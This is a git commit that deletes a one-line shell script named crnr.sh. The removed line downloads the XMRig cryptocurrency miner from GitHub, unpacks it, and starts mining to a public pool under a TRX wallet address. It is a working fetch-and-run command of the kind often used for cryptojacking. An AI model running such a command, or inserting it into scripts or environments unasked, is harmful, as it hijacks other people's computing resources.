041ce5562665e5163fea3a5fff400040e3bd4962
mrkkk01 <122241070+mrkkk01@users.noreply.github.com>
2023-01-09 04:37:59 +0300

    Delete crnr.sh

--- crnr.sh
+++
@@ -1,1 +0,0 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TEDEsQYwoBSd2L337XrzgeuFsw4iMiUxNz.mfb -p x
